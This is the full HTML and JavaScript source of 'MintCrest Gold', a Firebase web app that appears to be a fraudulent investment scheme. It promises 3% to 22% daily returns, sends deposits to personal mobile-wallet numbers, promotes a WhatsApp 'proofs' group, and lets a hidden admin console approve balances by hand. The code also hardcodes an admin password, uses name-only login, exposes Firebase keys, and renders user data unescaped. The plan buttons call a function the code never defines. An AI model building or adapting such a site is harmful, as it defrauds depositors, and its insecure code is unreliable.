<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">
            📢 <span id="ticker-text">Welcome to MintCrest Gold - Secure Your Future Today!</span>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Official Digital Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all text-white">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
            <p class="mt-8 text-[7px] text-gray-600 uppercase font-bold tracking-widest">© 2026 MintCrest Gold Enterprise</p>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-500 uppercase italic">System Syncing...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5">No Active Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition-transform">📥 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition-transform">📤 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic tracking-widest">Lucky Node Spin</h3>
                <div id="spin-visual" class="w-32 h-32 border-4 border-yellow-500/20 rounded-full mx-auto mb-6 flex items-center justify-center text-3xl shadow-2xl bg-white/5">🎰</div>
                <button id="spin-btn" onclick="startSpin()" class="bg-yellow-600 px-10 py-3 rounded-2xl font-black text-[10px] uppercase shadow-lg disabled:opacity-30">Spin Wheel</button>
                <p id="spin-timer" class="mt-4 text-[8px] font-bold text-gray-500 uppercase tracking-widest italic"></p>
            </div>

            <div class="glass p-8 rounded-[3rem] text-center border-b-4 border-green-500">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-2">Official Community</h3>
                <p class="text-[7px] text-gray-500 mb-4 uppercase italic">Latest Proofs & Updates</p>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="inline-block bg-green-600 px-8 py-3 rounded-2xl font-black text-[9px] uppercase tracking-widest">💬 Join Group</a>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[11px] uppercase italic text-center underline mb-4">Firm Privacy & Policy</h3>
                <div class="text-[8px] text-gray-400 space-y-3 leading-relaxed font-bold uppercase italic">
                    <p>1. <span class="text-white">Withdrawals:</span> Requests take 2-24 hours. A 10% maintenance fee is auto-deducted.</p>
                    <p>2. <span class="text-white">Security:</span> One account per device. Violation leads to permanent ban.</p>
                    <p>3. <span class="text-white">Investments:</span> All plans are valid for 30 days. Daily yield is credited every 24 hours.</p>
                </div>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic tracking-widest">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>JAZZCASH/SADAPAY</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/5 text-white">
                <input type="text" id="dep-trx" placeholder="TID (Transaction ID)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold uppercase outline-none border border-white/5 text-white">
                <input type="text" id="dep-promo" placeholder="PROMO CODE (IF ANY)" class="w-full bg-blue-500/5 p-4 rounded-2xl mb-6 text-center text-[9px] font-bold uppercase outline-none border border-blue-500/20 text-blue-400">

                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-8 border border-dashed border-white/20 cursor-pointer">
                    <span id="file-label" class="text-[9px] font-bold opacity-50 uppercase italic">📸 Upload Screenshot Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Screenshot Ready ✅'">
                </label>

                <button id="dep-btn" onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/5 text-white">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold outline-none border border-white/5 text-white">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div id="adm-sec-requests" class="space-y-3 pb-24"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[7px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[7px] font-black uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1">📜<span class="text-[7px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1">🏢<span class="text-[7px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Bronze-S", p: 1000, r: 3.5, d: 30 },
            { n: "Silver-X", p: 5000, r: 4.5, d: 30 }, { n: "Gold-Master", p: 15000, r: 6, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, lastSpin: 0 });
            startSync(name);
            document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); updateUI(); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center mb-2 text-[9px] font-black uppercase border-l-4 border-blue-500"><div>${d.type}</div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function updateUI() {
            document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
            document.getElementById('tier-tag').innerText = user.tierName || "Inactive";
            
            // Spin Check
            const last = user.lastSpin || 0;
            const diff = Date.now() - last;
            const btn = document.getElementById('spin-btn');
            if(diff < 86400000) {
                btn.disabled = true;
                const hours = Math.ceil((86400000 - diff) / 3600000);
                document.getElementById('spin-timer').innerText = `READY IN ${hours}H`;
            } else { btn.disabled = false; document.getElementById('spin-timer').innerText = "NODE READY"; }
        }

        async function startSpin() {
            const win = [5, 10, 20, 50, 0, 100][Math.floor(Math.random()*6)];
            document.getElementById('spin-visual').innerText = "⏳";
            setTimeout(async () => {
                document.getElementById('spin-visual').innerText = "₨ " + win;
                if(win > 0) await db.collection("requests").add({ user: user.name, amount: win, type: "Spin Bonus", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert(win > 0 ? "Bonus submitted!" : "No luck!");
            }, 2000);
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buy(${p.p}, '${p.n}')" class="glass p-5 rounded-[2rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2"><div><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily</p></div><div class="font-black text-[12px]">₨ ${p.p}</div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value, p = document.getElementById('dep-promo').value, f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Incomplete!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, promo: p||"None", proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Logged!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value, acc = document.getElementById('wd-acc').value; if(!a || !acc || a > user.balance) return alert("Error!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - a }); alert("Success!");
        }

        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); 
            document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); 
            document.getElementById('p-'+p).classList.add('active-page');
            document.getElementById('n-'+p)?.classList.add('active-tab');
        }

        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black mb-2 uppercase"><div>${d.user}<br>Rs ${d.amount}<br>Promo: ${d.promo||'No'}</div><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-blue-600 px-3 py-2 rounded">OK</button></div>`; });
            });
        }
        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); 
            if(act==='approved' && (type==='deposit' || type==='Spin Bonus')) await ref.update({ balance: (doc.data().balance||0)+amt });
            await db.collection("requests").doc(id).update({ status: act }); alert("Done!");
        }
        function updateCountdown() {
            if(user && user.activeTier > 0) {
                const d = (user.lastReqTime + 86400000) - Date.now();
                document.getElementById('countdown-display').innerText = d > 0 ? "YIELD SYNCING" : "YIELD READY";
            } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; }
        }
    </script>
</body>
</html>
